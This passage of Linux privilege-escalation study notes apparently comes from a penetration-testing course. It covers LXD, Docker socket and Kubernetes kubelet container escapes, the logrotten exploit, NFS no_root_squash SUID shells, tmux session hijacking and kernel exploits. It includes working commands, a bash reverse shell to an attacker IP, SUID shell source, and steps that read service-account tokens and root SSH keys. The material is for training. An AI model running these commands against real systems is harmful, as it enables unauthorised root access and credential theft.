    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
    | ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+

`Create and Exploit`
After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

    lxc init ubuntutemp privesc -c security.privileged=true
    lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

    lxc start privesc
    lxc exec privesc /bin/bash
    root@nix02:~# ls -l /mnt/root
    
    total 68
    lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
    drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
    drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
    drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
    drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
    drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
    lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
    lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
    lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
    lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
    drwx------   2 root root 16384 Oct  6  2021 lost+found
    drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
    drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
    drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
    dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
    drwx------   6 root root  4096 Sep 26 21:11 root
    drwxr-xr-x  28 root root   920 Oct 24 13:32 run
    lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
    drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
    drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
    dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
    drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
    drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
    drwxr-xr-x  13 root root  4096 Apr 23  2020 var


<a id="orga5a050d"></a>

## Docker

Docker is an open-source tool that provides a consistent runtime environment for software applications through the use of containers. Containers are isolated environments that run at the operating system level and share system resources, making them efficient and portable. Docker encapsulates applications into containers, which are lightweight, standalone executable packages containing all the necessary components to run an application.

`Docker Architecture`:
The Docker architecture follows a client-server model with two primary components:

`Docker Daemon`: Also known as the Docker server, it manages container creation, execution, and monitoring. It handles image management, monitoring, logging, resource utilization, container networking, and storage management, including Docker volumes.

`Docker Client`: It serves as the interface for users to interact with Docker. Users issue commands through the Docker Client, which communicates with the Docker Daemon via a RESTful API or Unix socket. Users can perform various tasks, such as creating, starting, stopping, managing containers, searching, downloading images, and more.

`Docker Clients`:
Docker Compose is another client for Docker, simplifying the orchestration of multiple containers as a single application. Users define their application's architecture using a declarative `YAML file`, specifying **container images, dependencies, configurations, networking, volume bindings, and other settings**. Docker Compose ensures that all defined containers are launched and interconnected to create a cohesive application stack.

`Docker Desktop`:
Docker Desktop is a user-friendly GUI tool available for macOS, Windows, and Linux. It simplifies container management by providing visual monitoring of container status, log inspection, and resource allocation management. Docker Desktop is suitable for developers of all expertise levels and supports Kubernetes.

`Docker Images and Containers`:
`Docker Images`: These serve as blueprints or templates for creating containers. An image contains everything required to run an application, including code, dependencies, libraries, and configurations. Images are read-only and ensure consistency across different environments. `Dockerfiles` define the steps and instructions for building images.

`Docker Containers`: Containers are instances of Docker images. They are **lightweight, isolated, and executable environments** for running applications. Containers inherit properties and configurations from their parent images. Each container **operates independently with its own filesystem, processes, and network interfaces**, ensuring separation from the host system and other containers. Containers are mutable and can be interacted with during runtime, but changes are not persisted unless saved as a new image or stored in a persistent volume.

In summary, Docker simplifies the deployment and management of applications by using containers to encapsulate everything needed for an application to run consistently across various environments.

`Docker Privilage Escalation`
What can happen is that we get access to an environment where we will find users who can manage docker containers. With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. We can use several ways and techniques to escalate our privileges or escape the docker container.


<a id="org78709ed"></a>

### Docker Shared Directories

In Docker, shared directories, or volume mounts, connect the host system and container filesystems. They enable data persistence, code sharing, and collaboration. Administrators define shared paths between the host and container. Shared directories can be read-only or read-write, offering flexibility.
When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.

    ls -l
    cat .ssh/id_rsa

From here on, we could copy the contents of the private SSH key to cry0l1t3.priv file and use it to log in as the user cry0l1t3 on the host system.

    ssh cry0l1t3@<host IP> -i cry0l1t3.priv


<a id="orgb6b85be"></a>

### Docker Socket

In summary, a Docker socket, or Docker daemon socket, serves as a crucial communication channel between the Docker client and the Docker daemon. It can use either a Unix socket or a network socket, depending on the Docker configuration. This socket enables users to issue commands through the Docker CLI, with the Docker client transmitting these commands to the Docker socket. The Docker daemon then processes these commands and carries out the requested actions.

To ensure secure communication and prevent unauthorized access, Docker sockets are typically restricted to specific users or user groups. This access control ensures that only trusted individuals can interact with the Docker daemon through the socket. Moreover, exposing the Docker socket over a network interface allows for remote management of Docker hosts, offering increased flexibility for distributed Docker setups and remote administration.

However, it's important to be aware of potential security risks associated with Docker sockets. Depending on the configuration, automated processes or tasks may store files that contain sensitive information. Malicious actors could exploit this information to escape the Docker container and gain unauthorized access. Therefore, it's essential to implement robust security measures and conduct regular audits of your Docker setup to mitigate these risks effectively and maintain a secure Docker environment.

    ls -al
    
    total 8
    drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
    drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
    srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock

From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86_64/docker) and upload it to the Docker container.

    wget https://<parrot-os>:443/docker -O docker
    chmod +x docker
    ls -l
    
    -rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker
    
    /tmp/docker -H unix:///app/docker.sock ps
    
    CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
    3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   ap

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.

    /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
    /tmp/docker -H unix:///app/docker.sock ps
    
    CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
    7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
    3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
    <SNIP>

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

    /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


<a id="orgce39049"></a>

### Writable Socket

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

    docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash


<a id="orgb04cc47"></a>

## Kubernetes

[Kubernetes](https://kubernetes.io/), or `K8s` is a technology that has revolutionized `devops` processes
One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications.

Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`.


<a id="org324a5e2"></a>

### K8s Concept

Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.


<a id="org0c9775a"></a>

### Different between K8 and Docker

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left"><b>Function</b></th>
<th scope="col" class="org-left"><b>Docker</b></th>
<th scope="col" class="org-left"><b>Kubernetes</b></th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left"><code>Primary</code></td>
<td class="org-left">Platform for containerizing Apps</td>
<td class="org-left">An orchestration tool for managing containers</td>
</tr>


<tr>
<td class="org-left"><code>Scaling</code></td>
<td class="org-left">Manual scaling with Docker swarm</td>
<td class="org-left">Automatic scaling</td>
</tr>


<tr>
<td class="org-left"><code>Networking</code></td>
<td class="org-left">Single network</td>
<td class="org-left">Complex network with policies</td>
</tr>


<tr>
<td class="org-left"><code>Storage</code></td>
<td class="org-left">Volumes</td>
<td class="org-left">Wide range of storage options</td>
</tr>
</tbody>
</table>


<a id="org8b73081"></a>

### Architecture

Kubernetes architecture is primarily divided into two types of components:

-   `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
-   `The Worker Nodes` (minions), where the containerized applications are run

1.  Nodes

    The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.

2.  Control Plane

    The Control Plane serves as the management layer. It consists of several crucial components, including:
    
    <table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
    
    
    <colgroup>
    <col  class="org-left" />
    
    <col  class="org-right" />
    </colgroup>
    <thead>
    <tr>
    <th scope="col" class="org-left"><b>Service</b></th>
    <th scope="col" class="org-right"><b>TCP Ports</b></th>
    </tr>
    </thead>
    
    <tbody>
    <tr>
    <td class="org-left">etcd</td>
    <td class="org-right">2379,2380</td>
    </tr>
    
    
    <tr>
    <td class="org-left">API server</td>
    <td class="org-right">6443</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Scheduler</td>
    <td class="org-right">10251</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Controller Manager</td>
    <td class="org-right">10252</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Kubelet API</td>
    <td class="org-right">10250</td>
    </tr>
    
    
    <tr>
    <td class="org-left">Read-Only Kubectl API</td>
    <td class="org-right">10255</td>
    </tr>
    </tbody>
    </table>
    
    These elements enable the `Control Plane` to make decisions and provide a comprehensive view of the entire cluster.

3.  Minions

    Within a containerized environment, the `Minions` (worker nodes) serve as the designated location for running applications. It's important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.
    
    The `Scheduler`, based on the `API server`, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the `etcd`.
    
    Understanding how these components interact is essential for grasping the functioning of Kubernetes. The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.


<a id="org857b77d"></a>

### K8's Security Measures

Kubernetes security can be divided into several domains:

-   Cluster infrastructure security
-   Cluster configuration security
-   Application security
-   Data security

Each domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.


<a id="org206d41e"></a>

### Kubernetes API

The core of Kubernetes architecture is its API that plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.

Each unique resource comes equipped with a distinct set of operations that can be executed, including but not limited to:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left"><b>Request</b></th>
<th scope="col" class="org-left"><b>Description</b></th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">GET</td>
<td class="org-left">Retrieves information about a resource or a list of resources.</td>
</tr>


<tr>
<td class="org-left">POST</td>
<td class="org-left">Creates a new resource.</td>
</tr>


<tr>
<td class="org-left">PUT</td>
<td class="org-left">Updates an existing resource.</td>
</tr>


<tr>
<td class="org-left">PATCH</td>
<td class="org-left">Applies partial updates to a resource.</td>
</tr>


<tr>
<td class="org-left">DELETE</td>
<td class="org-left">Removes a resource.</td>
</tr>
</tbody>
</table>


<a id="orga533607"></a>

### Authentication

In terms of authentication, Kubernetes supports various methods which serve to verify the user's identity.
Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`). This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources. This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.

In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. 


<a id="orgd2e9406"></a>

### K8's API Server Interaction

    curl https://10.129.10.11:6443 -k
    {
            "kind": "Status",
            "apiVersion": "v1",
            "metadata": {},
            "status": "Failure",
            "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
            "reason": "Forbidden",
            "details": {},
            "code": 403
    }

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a `403 Forbidden` status code accordingly.


<a id="orgaace85a"></a>

### Kubelet API - Extracting Pods

    curl https://10.129.10.11:10250/pods -k | jq .
    
    ...SNIP...
    {
      "kind": "PodList",
      "apiVersion": "v1",
      "metadata": {},
      "items": [
        {
          "metadata": {
            "name": "nginx",
            "namespace": "default",
            "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
            "resourceVersion": "491",
            "creationTimestamp": "2023-07-04T10:42:02Z",
            "annotations": {
                "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
              "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
              "kubernetes.io/config.source": "api"
            },
            "managedFields": [
              {
                "manager": "kubectl-client-side-apply",
                "operation": "Update",
                "apiVersion": "v1",
                "time": "2023-07-04T10:42:02Z",
                "fieldsType": "FieldsV1",
                "fieldsV1": {
                  "f:metadata": {
                    "f:annotations": {
                      ".": {},
                      "f:kubectl.kubernetes.io/last-applied-configuration": {}
                    }
                  },
                  "f:spec": {
                    "f:containers": {
                      "k:{\"name\":\"nginx\"}": {
                        ".": {},
                        "f:image": {},
                        "f:imagePullPolicy": {},
                        "f:name": {},
                        "f:ports": {
                                            ...SNIP...

The information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.


<a id="org38b5f90"></a>

### Kubeletctl - Extracting Pods

    kubeletctl -i --server 10.129.10.11 pods
    
    ┌────────────────────────────────────────────────────────────────────────────────┐
    │                                Pods from Kubelet                               │
    ├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
    │   │ POD                                │ NAMESPACE   │ CONTAINERS              │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 2 │ nginx                              │ default     │ nginx                   │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
    │ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
    │   │                                    │             │                         │
    ├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤

To effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.


<a id="orgff9aaca"></a>

### Kubelet API - Available Commands

    kubeletctl -i --server 10.129.10.11 scan rce
    
    ┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
    │                                   Node with pods vulnerable to RCE                                  │
    ├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
    │   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │   │              │                                    │             │                         │ RUN │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
    │ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
    ├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤

It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.


<a id="org1827051"></a>

### Kubelet API - Executing Commands

    kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
    
    uid=0(root) gid=0(root) groups=0(root)

The output of the command shows that the current user executing the `id` command inside the container has root privileges. This indicates that we have gained administrative access within the container, which could potentially lead to privilege escalation vulnerabilities. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.


<a id="org38020a0"></a>

### Privilage Escalation

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

1.  Kubelet API - Extracting Tokens

        kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
        
        eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw

2.  Kubelet API - Extracting Certificates

        kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
        
        -----BEGIN CERTIFICATE-----
        MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
        <SNIP>
        MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
        602eXnhZAL3+dA==
    
    Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.

3.  List Privilages

        export token=`cat k8.token`
        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
        
        Resources										Non-Resource URLs	Resource Names	Verbs 
        selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
        selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
        pods											[]					[]				[get create list]
        ...SNIP...
    
    Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:
    
        apiVersion: v1
        kind: Pod
        metadata:
          name: privesc
          namespace: default
        spec:
          containers:
          - name: privesc
            image: nginx:1.14.2
            volumeMounts:
            - mountPath: /root
              name: mount-root-into-mnt
          volumes:
          - name: mount-root-into-mnt
            hostPath:
               path: /
          automountServiceAccountToken: true
          hostNetwork: true
    
    Once created, we can now create the new pod and check if it is running as expected.

4.  Creating a new POD

        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
        
        pod/privesc created
        
        kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
    
    If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

5.  Extracting Root's SSH Key

        kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc


<a id="org82c940d"></a>

## Logrotate

Logrotate is a Linux tool that manages log files to prevent disk overflow. It **renames** old log files, can **create** new ones, and **offers options** based on file **size** and **age**. It's controlled through *`etc/logrotate.conf` and configuration files in /~etc/logrotate.d~*. You can force rotation using -f/&#x2013;force or manually edit the status file (/var/lib/logrotate.status). Example configuration for dpkg logs is in /etc/logrotate.d/dpkg.
Utility options:

    cat /etc/logrotate.conf
    
    # see "man logrotate" for details
    
    # global options do not affect preceding include directives
    
    # rotate log files weekly
    weekly
    
    # use the adm group by default, since this is the owning group
    # of /var/log/syslog.
    su root adm
    
    # keep 4 weeks worth of backlogs
    rotate 4
    
    # create new (empty) log files after rotating old ones
    create
    
    # use date as a suffix of the rotated file
    #dateext
    
    # uncomment this if you want your log files compressed
    #compress
    
    # packages drop log rotation information into this directory
    include /etc/logrotate.d
    
    # system-specific logs may also be configured here.

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

      ls /etc/logrotate.d/
    
      alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
    
      cat /etc/logrotate.d/dpkg
    
    /var/log/dpkg.log {
            monthly
            rotate 12
            compress
            delaycompress
            missingok
            notifempty
            create 644 root root
    }

To exploit `logrotate`, we need some requirements that we have to fulfill.

1.  we need `write` permissions on the log files
2.  logrotate must run as a privileged user or `root`
3.  vulnerable versions:
    -   3.8.6
    -   3.11.0
    -   3.15.0
    -   3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

    git clone https://github.com/whotwagner/logrotten.git
    cd logrotten
    gcc logrotten.c -o logrotten

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the IP and port of our VM that we use to attack the target system.

    echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

    grep "create\|compress" /etc/logrotate.conf | grep -v "#"
    
    create

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.
After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.

    nc -nlvp 9001
    
    Listening on 0.0.0.0 9001

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or `root`.

    ./logrotten -p ./payload /tmp/tmp.log

`TIPS`
to manually trigger logrotate we can delete the old logs and write on the newer ones. In some cases this can work


<a id="orgc946fb3"></a>

## Miscellaneous Techniques


<a id="orga280ae2"></a>

### Passive Traffic Capture

If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire.


<a id="org209c616"></a>

### Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command:

    showmount -e 10.129.2.12
    
    Export list for 10.129.2.12:
    /tmp             *
    /var/nfs/general *

When an NFS volume is created, various options can be set:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Option</th>
<th scope="col" class="org-left">Description</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">root<sub>squash</sub></td>
<td class="org-left">If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.</td>
</tr>


<tr>
<td class="org-left">no<sub>root</sub><sub>squash</sub></td>
<td class="org-left">Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.</td>
</tr>
</tbody>
</table>

    cat /etc/exports
    
    # /etc/exports: the access control list for filesystems which may be exported
    #		to NFS clients.  See exports(5).
    #
    # Example for NFSv2 and NFSv3:
    # /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
    #
    # Example for NFSv4:
    # /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
    # /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
    #
    /var/nfs/general *(rw,no_root_squash)
    /tmp *(rw,no_root_squash)

For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

    cat shell.c 
    
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    int main(void)
    {
      setuid(0); setgid(0); system("/bin/bash");
    }

    gcc shell.c -o shell

    sudo mount -t nfs 10.129.2.12:/tmp /mnt
    root@Pwnbox:~$ cp shell /mnt
    root@Pwnbox:~$ chmod u+s /mnt/shell

    ls -la
    
    total 68
    drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
    drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
    drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
    drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
    -rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell

    ./shell
    id
    
    uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(user)


<a id="orga48e5b8"></a>

### Hijacking Tmux Sessions

Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

    tmux -S /shareds new -s debugsess
    chown root:devs /shareds

If we can compromise a user in the `dev` group, we can attach to this session and gain root access.
Check for any running `tmux` processes.

    ps aux | grep tmux
    
    root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess

Confirm permissions.

    ls -la /shareds 
    
    srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds

Review our group membership.

    id
    
    uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

Finally, attach to the `tmux` session and confirm root privileges.

    tmux -S /shareds
    
    id
    
    uid=0(root) gid=0(root) groups=0(root)


<a id="orga12b656"></a>

# Linux Internals-based Privilege Escalation


<a id="org76209a0"></a>

## Kernel Exploits

Kernel level exploits exist for a variety of Linux kernel versions.
It is very common to find systems that are vulnerable to kernel exploits.
Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it.  A quick way to identify exploits is to issue the command `uname -a` and search Google for the kernel version.

    Note: Kernel exploits can cause system instability so use caution when running these against a production system.

`EXEMPLE`

    uname -a
    
    Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

    cat /etc/lsb-release 
    
    DISTRIB_ID=Ubuntu
    DISTRIB_RELEASE=16.04
    DISTRIB_CODENAME=xenial
    DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download, it to the system using `wget` or another file transfer method. We can compile the exploit code using gcc and set the executable bit using `chmod +x`.

    gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit

Next, we run the exploit and hopefully get dropped into a root shell.

    ./kernel_exploit 
    
    task_struct = ffff8800b71d7000
    uidptr = ffff8800b95ce544
    spawning root shell


<a id="org45a9013"></a>

## Shared Library

It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.

There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.

Additionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.

    ldd /bin/ls
    
